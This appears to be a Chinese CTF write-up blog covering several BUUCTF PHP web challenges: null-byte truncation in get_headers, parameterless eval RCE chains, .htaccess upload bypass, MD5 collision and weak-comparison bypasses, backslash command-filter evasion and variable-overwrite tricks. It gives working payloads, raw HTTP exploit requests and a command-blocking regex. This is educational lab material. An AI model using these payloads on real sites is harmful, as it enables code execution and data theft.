title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p>题目给出提示：cve-2020-7066</p><p>通过搜索引擎查找得到如下信息：<a href="https://bugs.php.net/bug.php?id=79329">https://bugs.php.net/bug.php?id=79329</a></p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917132843319.png" alt="image-20200917132843319"></p><p>可以看到在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中<code>get_headers</code>函数存在00截断问题。</p><p>题目首页告诉了我们：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You just view *.ctfhub.com</span><br></pre></td></tr></table></figure><p>故不能直接输入其他的地址，故我们尝试截断试试让其获取的值为本地IP：127.0.0.1：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917133340932.png" alt="image-20200917133340932">可以看到题目返回了PHP版本为7.3.15，00截断问题存在，而后又给出了提示，HOST必须为123，修改或访问得到FLAG：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917133838216.png" alt="image-20200917133838216"></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>打开题目，首页显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在哪里呢？</span><br></pre></td></tr></table></figure><p>查看源代码以及响应头，均无tips给出</p><p>使用direarch扫描文件，得到如下结果：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917142513897.png" alt="image-20200917142513897"></p><p>发现存在.git目录泄露，尝试还有lijiejie的githack脚本还原代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Githack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p>得到文件index.php，源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显，题目需要我们构造一个无参命令执行payload。</p><p>常见的无参构造利用方法如下：</p><blockquote><ul><li>getenv()+array_rand()+array_flip()，其中getenv返回包含当前环境信息的数组，array_rand随机返回数组的值，array_flip将数组键值互换。</li><li>end(getallheaders())</li><li>apache+array_rand()+end()+ger_defined_vars()</li><li>hex2bin()+session_id()+session_start()，PHPSESSION允许数字与字母出现（部分符号也可，如括号，点号）。</li><li>dirname()取目录参数的上一级目录，getcwd()取当前目录，chdir设置当前工作目录。跨目录读取demo：<code>readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code>。</li><li><code>readfile(next(array_reverse(scandir(current(localeconv())))));</code></li></ul><p>摘自：<a href="[https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a>)</p></blockquote><blockquote><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> – 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> – 将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> – 将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> – 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> – 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><p>常见数组操作，摘自：w3school</p></blockquote><p>题目关键正则分析：<code>[a-z,_]+\((?R)?\)</code></p><p><code>(?R)</code>表示当前正则表达式，也就是<code>[a-z,_]+\((?R)?\)</code>本身，故这个表达式本质上类似套娃正则，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[a-z,_]+\([a-z,_]+\([a-z,_]+\([a-z,_]+\(...\)\)\)\)</span><br><span class="line">能匹配：</span><br><span class="line">a(b(c(...))) # 任意个函数的嵌套，注意都是用的函数返回值做参</span><br></pre></td></tr></table></figure><p>法一：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917144953794.png" alt="image-20200917144953794"></p><p>法二：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917145856228.png" alt="image-20200917145856228"></p><p>法三：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917150050106.png" alt="image-20200917150050106"></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>经典上传题，.htaccess解析图片即可。</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917151230825.png" alt="image-20200917151230825"></p><p>上传包含php代码的文件：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917151319238.png" alt="image-20200917151319238"></p><p>访问即可得到FLAG：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917151337633.png" alt="image-20200917151337633"></p><p>简单总结下上传题经典套路：</p><ul><li>gif89a文件头、<code>Content-Type: image/jpeg</code>文件类型、上传<code>%00</code>截断文件名</li><li><code>php、php2、php3、php4、php5、phtml、phtm</code>后缀</li><li>.htaccess、.user.ini特殊上传，前者要求apache环境后者要求，同目录下需要存在一个php文件</li><li><code>&lt;script language=”php”&gt;</code>、<code>&lt;? ?&gt;</code>、<code>&lt;?= ?&gt;</code>。</li></ul><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>打开题目，观察到被跳转到了另一个URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>img参数有点想base64编码，连续base64解码得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3535352e706e6630</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917154221860.png" alt="image-20200917154221860"></p><p>注意观察，有数字，有字母，无符号，数字<code>0、3、5、2、7、6</code>，字母<code>e</code>，满足hex的范畴，尝试hex转字符串得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">555.pnf0</span><br></pre></td></tr></table></figure><p>故此题的编码应该为string-&gt;hex-&gt;base64-&gt;base64</p><p>尝试读取index.php，img参数为<code>base64_encode(base64_encode(hex2bin(&#39;index.php&#39;)))</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>得index.php源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(.&#x2F;bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>其中关于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])</span><br></pre></td></tr></table></figure><p>的绕过是老生常谈了，这里对这种md5函数总结一下几种方法：</p><ul><li><p>数组对比，a[]=1&amp;b[]=2，md5($a)=null且md5($b)=null</p></li><li><p>0e弱比较绕过，s878926199a和s1091221200a</p></li><li><p><code>`</code><br>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br>明文不同，MD5相同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ md5($str,true)：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>content: 129581926211651571912466741651878684928<br>hex: 06da5430449f8f6f23dfc1276f722738<br>raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1’or’8<br>string: T0Do#’or’8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>string: ‘or’6]!r,b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ NaN和INF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这里我们用第三种办法来绕过即可，而对于命令执行，我们知道，在php中，反引号\&#96;可以当做系统命令执行，而这里又进行了很多过滤，在之前篇的刷题记录中我有提到命令执行的常见讨论，这里我们使用反斜线\绕过。</span><br><span class="line"></span><br><span class="line">在Linux中，反斜线会被省略掉，即&#96;ca\t&#96;与&#96;cat&#96;相同。</span><br><span class="line"></span><br><span class="line">故EXP：</span><br><span class="line"></span><br><span class="line">![image-20200917162459727](https:&#x2F;&#x2F;img.0x002.com&#x2F;article&#x2F;BuuCTF3&#x2F;image-20200917162459727.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## [MRCTF2020]Ez_bypass</span><br><span class="line"></span><br><span class="line">打开题目得到如下源代码：</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>简单的md5绕过+弱比较，EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?gg[]&#x3D;1&amp;id[]&#x3D;2 HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">passwd&#x3D;1234567a</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>打开题目，页面元素过多，感觉没有啥可用的信息。</p><p>简单看一下HTML源代码+请求响应头后，就打开direarch开始扫描了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 direarch.py -u http:&#x2F;&#x2F;x.x.x.x&#x2F; -e php,zip -t 1 # BUU请求数限制</span><br></pre></td></tr></table></figure><p>扫描器有扫到.git目录，随后打开lijiejie的githack工具，尝试dump下源码。</p><p>主要文件index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>可用看到开头就有两个变量注册：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会把<code>$_GET</code>和<code>$_POST</code>的键名作为变量名，值作为变量值，来组成新的变量。</p><p>接着有三段连续的死亡exit，我们不能让我们的payload执行到那里。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 批量判断$_GET中是否存在键名与$_GET[&#x27;flag&#x27;]的值相同的其他键</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断$_GET[&#x27;flag&#x27;]与$_POST[&#x27;flag&#x27;]是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断$_POST[&#x27;flag&#x27;]或$_GET[&#x27;flag&#x27;]是否为flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的关键是需要满足<code>isset($_GET[&#39;flag&#39;]) || isset($_POST[&#39;flag&#39;]</code>的同时，还需满足<code>$_POST[&#39;flag&#39;] !== &#39;flag&#39;  &amp;&amp; $_GET[&#39;flag&#39;] !== &#39;flag&#39;</code>。</p><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET方式传递参数yds=flag，使得<code>$yds=$flag</code>，最终执行到上述代码时带出flag的值。</p><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?_POST&#x3D;_GET&amp;_GET&#x3D;_COOKIE HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxx.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) 